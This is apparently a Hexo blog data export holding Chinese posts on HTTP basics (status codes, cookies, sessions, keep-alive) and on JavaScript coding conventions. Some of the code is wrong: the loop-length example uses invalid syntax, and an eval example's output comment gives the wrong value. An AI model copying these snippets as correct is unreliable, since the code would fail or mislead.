</p>\n<ol>\n<li>GET 和 POST 请求参数位置不同，从上面两个请求报文可以看出，GET 请求对应的参数放在 URL 中，而 POST 请求对应的参数放在 HTTP 请求主体中。  </li>\n<li>GET 可提交的数据量受 URL 长度的限制，而 POST 的数据量则没有限制。</li>\n<li>处于安全考虑，在一些涉及安全的请求比如：登录请求需要用 POST 提交表单，而GET 请求一般用来获取静态资源。</li>\n</ol>\n<h3 id=\"HTTP-响应：\"><a href=\"#HTTP-响应：\" class=\"headerlink\" title=\"HTTP 响应：\"></a>HTTP 响应：</h3><p>HTTP 响应是服务器在客户端发送 HTTP 请求后经过一些处理而做出的响应，HTTP 响应和 HTTP 请求相似，也是由三个部分构成。分别是：状态行，响应头(Response Header)，响应正文。</p>\n<p>HTTP 响应中包含一个状态码，用来表示服务器对客户端响应的结果。  </p>\n<p>状态码一般由3位构成： </p>\n<ul>\n<li>1xx : 表示请求已经接受了，继续处理。   </li>\n<li>2xx : 表示请求已经处理掉了。  </li>\n<li>3xx : 重定向。  </li>\n<li>4xx : 一般表示客户端有错误，请求无法实现。  </li>\n<li>5xx : 一般为服务器端的错误。</li>\n</ul>\n<p>比较常用的状态码：  </p>\n<ul>\n<li>200 OK 客户端请求成功。 </li>\n<li>301 Moved Permanently 请求永久重定向。</li>\n<li>302 Moved Temporarily 请求临时重定向。</li>\n<li>304 Not Modified 文件未修改，可以直接使用缓存的文件。</li>\n<li>400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。</li>\n<li>401 Unauthonzed 请求未经授权，无法访问。</li>\n<li>403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。</li>\n<li>404 Not Found 请求的资源不存在，比如输入了错误的URL。</li>\n<li>500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>\n<li>503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。</li>\n</ul>\n<p>下面是一个 HTTP 响应的例子：<br><img src=\"/assets/2016-03-02-talk-http/4.png\" alt=\"\"></p>\n<p>知道了 HTTP 请求和响应后，一个完整的流程一般是这样的：</p>\n<p>通常，由 HTTP 客户端发起一个请求，建立一个到服务器指定端口（默认是 80 端口）的 TCP 连接。HTTP 服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。</p>\n<blockquote>\n<p>HTTP 使用 TCP 而不是 UDP 的原因在于（打开）一个网页必须传送很多数据，而 TCP 协议提供传输控制，按顺序组织数据，和错误纠正。</p>\n</blockquote>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><p>了解以上那些概念后，已经对 HTTP 协议有了大致的了解了。下面介绍一些 HTTP 实现中具体内容。</p>\n<h3 id=\"会话追踪\"><a href=\"#会话追踪\" class=\"headerlink\" title=\"会话追踪\"></a>会话追踪</h3><ul>\n<li>会话：客户端向服务器端发起请求到服务端响应客户端请求的全过程。</li>\n<li>会话跟踪：会话追踪指的是服务器对用户响应的监视。</li>\n</ul>\n<p>为什么需要会话跟踪： </p>\n<blockquote>\n<p>浏览器与服务器之间的通信是通过 HTTP 协议进行通信的，而 HTTP 协议是”无状态”的协议，它不能保存客户的信息，即一次响应完成之后连接就断开了，下一次的请求需要重新连接，这样就需要判断是否是同一个用户，所以才有会话跟踪技术来实现这种要求。</p>\n</blockquote>\n<h4 id=\"会话跟踪常用方法：\"><a href=\"#会话跟踪常用方法：\" class=\"headerlink\" title=\"会话跟踪常用方法：\"></a>会话跟踪常用方法：</h4><ul>\n<li>URL 重写：URL 重写技术就是在 URL 结尾添加一个附加数据以标识该会话，把会话 ID 通过 URL 的信息传递过去，以便在服务器进行识别不同的用户。</li>\n<li>隐藏表单域：将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示。</li>\n<li>Cookie：Cookie 是 Web 服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送给服务器端，进而进行用户的识别，对于客户端的每次请求，服务器都会将 Cookie 发送到客户端，客户端保存下来，以便下次使用。</li>\n</ul>\n<blockquote>\n<p>客户端可以采用两种方式来保存这个Cookie对象，一种方式是保存在客户端内存中，称为临时Cookie，浏览器关闭后这个Cookie对象将消失。 </p>\n<p>另外一种方式是保存在客户机的磁盘上，称为永久Cookie。以后客户端只要访问该网站，就会将这个Cookie再次发送到服务器上，前提是这个Cookie在有效期内，这样就实现了对客户的跟踪。</p>\n</blockquote>\n<p>Cookie 是可以被禁止的，当你打开 Chrome，在设置里面关闭 Cookie，那么你将再也无法登录淘宝页面。</p>\n<ul>\n<li>Session：在服务器端会创建一个 session 对象，产生一个 sessionID 来标识这个 session 对象，然后将这个 sessionID 放入到 Cookie 中发送到客户端，下一次访问时，sessionID 会发送到服务器，在服务器端进行识别不同的用户。</li>\n</ul>\n<blockquote>\n<p>每一个用户都有一个不同的 session，各个用户之间是不能共享的，是每个用户所独享的，在 session 中可以存放信息。</p>\n<p>Session的实现依赖于Cookie，如果Cookie被禁用，那么session也将失效。</p>\n</blockquote>\n<h3 id=\"条件-GET：\"><a href=\"#条件-GET：\" class=\"headerlink\" title=\"条件 GET：\"></a>条件 GET：</h3><p>HTTP 条件 GET 是 HTTP 协议为了减少不必要的带宽浪费，提出的一种方案。</p>\n<ol>\n<li>HTTP 条件 GET 使用时机：客户端之前已经访问过某网站，并打算再次访问该站点。</li>\n<li>HTTP 条件 GET 使用的方法：客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。</li>\n</ol>\n<p>下面是一个具体的发送接受报文示例：</p>\n<p>客户端发送请求：</p>\n<p><img src=\"/assets/2016-03-02-talk-http/5.png\" alt=\"\"></p>\n<p>第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件。</p>\n<p><img src=\"/assets/2016-03-02-talk-http/6.png\" alt=\"\"></p>\n<p>如果服务器端资源已经更新的话，就返回正常的响应。</p>\n<h3 id=\"持久连接：\"><a href=\"#持久连接：\" class=\"headerlink\" title=\"持久连接：\"></a>持久连接：</h3><p>我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接、连接重用）时，Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。</p>\n<p>在 HTTP 1.0 版本中，并没有官方的标准来规定 Keep-Alive 如何工作，因此实际上它是被附加到 HTTP 1.0协议上，如果客户端浏览器支持 Keep-Alive ，那么就在HTTP请求头中添加一个字段 Connection: Keep-Alive，当服务器收到附带有 Connection: Keep-Alive 的请求时，它也会在响应头中添加一个同样的字段来使用 Keep-Alive 。这样一来，客户端和服务器之间的HTTP连接就会被保持，不会断开（超过 Keep-Alive 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。</p>\n<p>在 HTTP 1.1 版本中，默认情况下所有连接都被保持，如果加入 “Connection: close” 才关闭。目前大部分浏览器都使用 HTTP 1.1 协议，也就是说默认都会发起 Keep-Alive 的连接请求了，所以是否能完成一个完整的 Keep-Alive 连接就看服务器设置情况。</p>\n<p>由于 HTTP 1.0 没有官方的 Keep-Alive 规范，并且也已经基本被淘汰，以下讨论均是针对 HTTP 1.1 标准中的 Keep-Alive 展开的。</p>\n<h3 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h3><ol>\n<li>会话跟踪和条件 GET 是有不同的，它们分别运用于不同的场景。会话跟踪是服务器用来表示标识区分不同的用户，而有条件 GET 则用户多次访问相同的页面，用来减少带宽的浪费，两者有本质上的区别。</li>\n<li>HTTP Keep-Alive 简单说就是保持当前的TCP连接，避免了重新建立连接。</li>\n<li>HTTP 是一个无状态无连接的协议，那么这是不是与 Keep-Alive 冲突？</li>\n</ol>\n<p>个人认为：Keep-Alive 与无连接的特性冲突，而对于无状态的特性两者并无矛盾，HTTP 无状态无连接是在 1.0 版本中就规定的，而 Keep-Alive 则是在 1.1 版本中才被添加入规范。  </p>\n<p>无连接的意思是限制每个连接只有一个请求的意思，在服务器处理完客户的请求，并收到客户的反应，即断开。通过这种方式可以节省传输时间。  </p>\n<p>Keep-Alive 确实破坏了这一特性，而无状态协议则意味着每个请求都是独立的，互不干扰的，互相没有记忆的。所以才需要有会话跟踪这种机制来识别用户。</p>\n<p>参考链接：  </p>\n<ul>\n<li><a href=\"http://baike.baidu.com/link?url=X1CqeVwoptB7-RFAJ6nWteQoTFYHFJYR7FRUhatC4F5amT4HGhZt2WMF--hZS6BaulGQbBgWeAzgNYv7qN8q7a\">http 百度百科</a>  </li>\n<li><a href=\"http://www.imooc.com/learn/348\">进击Node.js基础（一）技术学习教程 慕课网</a>  </li>\n<li><a href=\"http://hit-alibaba.github.io/interview/basic/network/HTTP.html\">HTTP 协议 笔试面试知识整理</a>  </li>\n</ul>\n"},{"layout":"post","title":"Javascript - 代码规范","date":"2016-03-07T04:00:00.000Z","author":"Lindz","header-img":"img/js-bg.jpg","_content":"\n记录一些 Javascript 编写的代码规范，方便以后查询和学习。\n\n### 在编写 Javascript 代码时应尽量避免全局变量的污染:\n\n```javascript\t\nfunction sum(x, y){\n\tresult = x + y;    //result 被添加到全局变量\n}\n```\n\n```javascript\t\nfunction foo(){\n\tvar a = b = 0;    //b 被添加到全局变量，被解析成 var a = (b = 0);\n}\n```\n\n### 在函数顶部预先声明该函数所需要的所有局部变量\n\n```javascript\nfunction func(){\n\tvar a = 1,\n\t\tb = 2,\n\t\tsum = a + b,\n\t\tobj = {};\n}\n```\n\n优点：\n\n* 提供了一个单一的地方去寻找功能所需要的所有局部变量\n* 防止变量在定义之前使用的逻辑错误\n\n如：\n\n```javascript\nfunction func(x){\n\tif(x > 1){\n\t\tvar y = 1;   //因为存在变量提升(预解析)，故变量重复定义\n\t}else{\n\t\tvar y = 2;\n\t}\n}\n```\n\n### 在循环体中，缓存数组或者集合的长度\n\n```javascript\nfor(var i = 0; len = myarray.length; i < len; i++){\n\t\t//do something\n}\n```\n\n### 始终使用 === 来进行判断，避免隐式类型转换\n\n```javascript\nvar zero = 0;\nif(zero === false){\n\t//不执行，因为不存在隐式类型转换\n}\n```\n\n### 避免使用 eval() 和 Function()\n\n```javascript\neval(\"var local = 3; console.log(local)\"); // 避免\n\nFunction(\"console.log('Hello World!');\")(); // 避免\n```\n\n注：不应该用 eval() 来解析 json 数据，而是改用 JSON.parse()\n\neval 代码中任何被评估的通过 var 定义的变量会被自动变成全局变量而 Function 不会, 这样 eval 一不小心就造成了全局变量污染\n\n```javascript\nvar evalString = \"var x = 1; console.log(x);\";\neval(evalString); // logs \"1\"\n\nvar funString = \"var y = 2; console.log(y);\";\nnew Function(funString)(); // logs \"2\"\n\nconsole.log(typeof x); // number\nconsole.log(typeof y); // \"undefined\"\n```\n\n另外一点，eval() 会干扰作用域链，它可以访问和修改它外部作用域中的变量，而 Function() 中只看到全局作用域。\n\n```javascript\n\n(function () {\n    var local = 1;\n    eval(\"local = 3; console.log(local)\");  //2\n    console.log(local);      //3\n})();\n\n(function () {\n    var local = 1;\n    Function(\"console.log(typeof local);\")();  //undefined\n})();\n```\n\n### 使用 parseInt 总是指定基数参数\n\n```javascript\nparseInt(\"123\",8);  //八进制数转化为十进制\n```\n\n### 使用花括号时，始终与之前的语句放在同一行\n\n错误示范：\n\n```javascript\nfunction func(){\n    return\n    {\n        name:'lindz';\n    };\n}\n\nconsole.log(typeof func());   //undefined\n```\n\n当你选择不使用分号结束一行代码时 JavaScript 会自己帮你补上，所以代码被解析为：\n\n```javascript\nfunction func(){\n    return;\n    {\n        name:'lindz';      //不执行\n    };\n}\n\nconsole.log(typeof func());   //undefined\n```\n\n### 推荐使用 // 这样的注释方式，/* */ 可能与正则表达式冲突\n\n### 空格的使用改善代码的可读性和一致性\n\n```javascript\n* for循环分号分开后的的部分：如for (var i = 0; i < 10; i += 1) {...}\n* for循环中初始化的多变量(i和max)：for (var i = 0, max = 10; i < max; i += 1) {...}\n* 分隔数组项的逗号的后面：var a = [1, 2, 3];\n* 对象属性逗号的后面以及分隔属性名和属性值的冒号的后面：var o = {a: 1, b: 2};\n* 限定函数参数：myFunc(a, b, c)\n* 函数声明的花括号的前面：function myFunc() {}\n* 匿名函数表达式function的后面：var myFunc = function () {};\n```\n\n\n\n\n","source":"_posts/2016-03-07-javascript-code-standard.md","raw":"---\nlayout:     post\ntitle:      \"Javascript - 代码规范\"\ndate:       2016-03-07 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/js-bg.jpg\"\ntags:\n    - Javascript\n---\n\n记录一些 Javascript 编写的代码规范，方便以后查询和学习。\n\n### 在编写 Javascript 代码时应尽量避免全局变量的污染:\n\n```javascript\t\nfunction sum(x, y){\n\tresult = x + y;    //result 被添加到全局变量\n}\n```\n\n```javascript\t\nfunction foo(){\n\tvar a = b = 0;    //b 被添加到全局变量，被解析成 var a = (b = 0);\n}\n```\n\n### 在函数顶部预先声明该函数所需要的所有局部变量\n\n```javascript\nfunction func(){\n\tvar a = 1,\n\t\tb = 2,\n\t\tsum = a + b,\n\t\tobj = {};\n}\n```\n\n优点：\n\n* 提供了一个单一的地方去寻找功能所需要的所有局部变量\n* 防止变量在定义之前使用的逻辑错误\n\n如：\n\n```javascript\nfunction func(x){\n\tif(x > 1){\n\t\tvar y = 1;   //因为存在变量提升(预解析)，故变量重复定义\n\t}else{\n\t\tvar y = 2;\n\t}\n}\n```\n\n### 在循环体中，缓存数组或者集合的长度\n\n```javascript\nfor(var i = 0; len = myarray.length; i < len; i++){\n\t\t//do something\n}\n```\n\n### 始终使用 === 来进行判断，避免隐式类型转换\n\n```javascript\nvar zero = 0;\nif(zero === false){\n\t//不执行，因为不存在隐式类型转换\n}\n```\n\n### 避免使用 eval() 和 Function()\n\n```javascript\neval(\"var local = 3; console.log(local)\"); // 避免\n\nFunction(\"console.log('Hello World!');\")(); // 避免\n```\n\n注：不应该用 eval() 来解析 json 数据，而是改用 JSON.parse()\n\neval 代码中任何被评估的通过 var 定义的变量会被自动变成全局变量而 Function 不会, 这样 eval 一不小心就造成了全局变量污染\n\n```javascript\nvar evalString = \"var x = 1; console.log(x);\";\neval(evalString); // logs \"1\"\n\nvar funString = \"var y = 2; console.log(y);\";\nnew Function(funString)(); // logs \"2\"\n\nconsole.log(typeof x); // number\nconsole.log(typeof y); // \"undefined\"\n```\n\n另外一点，eval() 会干扰作用域链，它可以访问和修改它外部作用域中的变量，而 Function() 中只看到全局作用域。\n\n```javascript\n\n(function () {\n    var local = 1;\n    eval(\"local = 3; console.log(local)\");  //2\n    console.log(local);      //3\n})();\n\n(function () {\n    var local = 1;\n    Function(\"console.log(typeof local);\")();  //undefined\n})();\n```\n\n### 使用 parseInt 总是指定基数参数\n\n```javascript\nparseInt(\"123\",8);  //八进制数转化为十进制\n```\n\n### 使用花括号时，始终与之前的语句放在同一行\n\n错误示范：\n\n```javascript\nfunction func(){\n    return\n    {\n        name:'lindz';\n    };\n}\n\nconsole.log(typeof func());   //undefined\n```\n\n当你选择不使用分号结束一行代码时 JavaScript 会自己帮你补上，所以代码被解析为：\n\n```javascript\nfunction func(){\n    return;\n    {\n        name:'lindz';      //不执行\n    };\n}\n\nconsole.log(typeof func());   //undefined\n```\n\n### 推荐使用 // 这样的注释方式，/* */ 可能与正则表达式冲突\n\n### 空格的使用改善代码的可读性和一致性\n\n```javascript\n* for循环分号分开后的的部分：如for (var i = 0; i < 10; i += 1) {...}\n* for循环中初始化的多变量(i和max)：for (var i = 0, max = 10; i < max; i += 1) {...}\n* 分隔数组项的逗号的后面：var a = [1, 2, 3];\n* 对象属性逗号的后面以及分隔属性名和属性值的冒号的后面：var o = {a: 1, b: 2};\n* 限定函数参数：myFunc(a, b, c)\n* 函数声明的花括号的前面：function myFunc() {}\n* 匿名函数表达式function的后面：var myFunc = function () {};\n```\n\n\n\n\n","slug":"2016-03-07-javascript-code-standard","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxm000fxmvdzhqx5t6z","content":"<p>记录一些 Javascript 编写的代码规范，方便以后查询和学习。</p>\n<h3 id=\"在编写-Javascript-代码时应尽量避免全局变量的污染\"><a href=\"#在编写-Javascript-代码时应尽量避免全局变量的污染\" class=\"headerlink\" title=\"在编写 Javascript 代码时应尽量避免全局变量的污染:\"></a>在编写 Javascript 代码时应尽量避免全局变量的污染:</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">x, y</span>)</span>&#123;</span><br><span class=\"line\">\tresult = x + y;    <span class=\"comment\">//result 被添加到全局变量</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = b = <span class=\"number\">0</span>;    <span class=\"comment\">//b 被添加到全局变量，被解析成 var a = (b = 0);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"在函数顶部预先声明该函数所需要的所有局部变量\"><a href=\"#在函数顶部预先声明该函数所需要的所有局部变量\" class=\"headerlink\" title=\"在函数顶部预先声明该函数所需要的所有局部变量\"></a>在函数顶部预先声明该函数所需要的所有局部变量</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\tb = <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\tsum = a + b,</span><br><span class=\"line\">\t\tobj = &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：</p>\n<ul>\n<li>提供了一个单一的地方去寻找功能所需要的所有局部变量</li>\n<li>防止变量在定义之前使用的逻辑错误</li>\n</ul>\n<p>如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x &gt; <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> y = <span class=\"number\">1</span>;   <span class=\"comment\">//因为存在变量提升(预解析)，故变量重复定义</span></span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> y = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"在循环体中，缓存数组或者集合的长度\"><a href=\"#在循环体中，缓存数组或者集合的长度\" class=\"headerlink\" title=\"在循环体中，缓存数组或者集合的长度\"></a>在循环体中，缓存数组或者集合的长度</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; len = myarray.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//do something</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"始终使用-来进行判断，避免隐式类型转换\"><a href=\"#始终使用-来进行判断，避免隐式类型转换\" class=\"headerlink\" title=\"始终使用 === 来进行判断，避免隐式类型转换\"></a>始终使用 === 来进行判断，避免隐式类型转换</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> zero = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(zero === <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//不执行，因为不存在隐式类型转换</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"避免使用-eval-和-Function\"><a href=\"#避免使用-eval-和-Function\" class=\"headerlink\" title=\"避免使用 eval() 和 Function()\"></a>避免使用 eval() 和 Function()</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"var local = 3; console.log(local)\"</span>); <span class=\"comment\">// 避免</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Function</span>(<span class=\"string\">\"console.log('Hello World!');\"</span>)(); <span class=\"comment\">// 避免</span></span><br></pre></td></tr></table></figure>\n<p>注：不应该用 eval() 来解析 json 数据，而是改用 JSON.parse()</p>\n<p>eval 代码中任何被评估的通过 var 定义的变量会被自动变成全局变量而 Function 不会, 这样 eval 一不小心就造成了全局变量污染</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> evalString = <span class=\"string\">\"var x = 1; console.log(x);\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(evalString); <span class=\"comment\">// logs \"1\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> funString = <span class=\"string\">\"var y = 2; console.log(y);\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(funString)(); <span class=\"comment\">// logs \"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> x); <span class=\"comment\">// number</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> y); <span class=\"comment\">// \"undefined\"</span></span><br></pre></td></tr></table></figure>\n<p>另外一点，eval() 会干扰作用域链，它可以访问和修改它外部作用域中的变量，而 Function() 中只看到全局作用域。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> local = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"string\">\"local = 3; console.log(local)\"</span>);  <span class=\"comment\">//2</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(local);      <span class=\"comment\">//3</span></span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> local = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">Function</span>(<span class=\"string\">\"console.log(typeof local);\"</span>)();  <span class=\"comment\">//undefined</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用-parseInt-总是指定基数参数\"><a href=\"#使用-parseInt-总是指定基数参数\" class=\"headerlink\" title=\"使用 parseInt 总是指定基数参数\"></a>使用 parseInt 总是指定基数参数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">parseInt</span>(<span class=\"string\">\"123\"</span>,<span class=\"number\">8</span>);  <span class=\"comment\">//八进制数转化为十进制</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"使用花括号时，始终与之前的语句放在同一行\"><a href=\"#使用花括号时，始终与之前的语句放在同一行\" class=\"headerlink\" title=\"使用花括号时，始终与之前的语句放在同一行\"></a>使用花括号时，始终与之前的语句放在同一行</h3><p>错误示范：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'lindz'</span>;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func());   <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<p>当你选择不使用分号结束一行代码时 JavaScript 会自己帮你补上，所以代码被解析为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        name:<span class=\"string\">'lindz'</span>;      <span class=\"comment\">//不执行</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func());   <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"推荐使用-这样的注释方式，-可能与正则表达式冲突\"><a href=\"#推荐使用-这样的注释方式，-可能与正则表达式冲突\" class=\"headerlink\" title=\"推荐使用 // 这样的注释方式，/ / 可能与正则表达式冲突\"></a>推荐使用 // 这样的注释方式，/<em> </em>/ 可能与正则表达式冲突</h3><h3 id=\"空格的使用改善代码的可读性和一致性\"><a href=\"#空格的使用改善代码的可读性和一致性\" class=\"headerlink\" title=\"空格的使用改善代码的可读性和一致性\"></a>空格的使用改善代码的可读性和一致性</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* <span class=\"keyword\">for</span>循环分号分开后的的部分：如<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i += <span class=\"number\">1</span>) &#123;...&#125;</span><br><span class=\"line\">* <span class=\"keyword\">for</span>循环中初始化的多变量(i和max)：<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, max = <span class=\"number\">10</span>; i &lt; max; i += <span class=\"number\">1</span>) &#123;...&#125;</span><br><span class=\"line\">* 分隔数组项的逗号的后面：<span class=\"keyword\">var</span> a = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">* 对象属性逗号的后面以及分隔属性名和属性值的冒号的后面：<span class=\"keyword\">var</span> o = &#123;a: <span class=\"number\">1</span>, b: 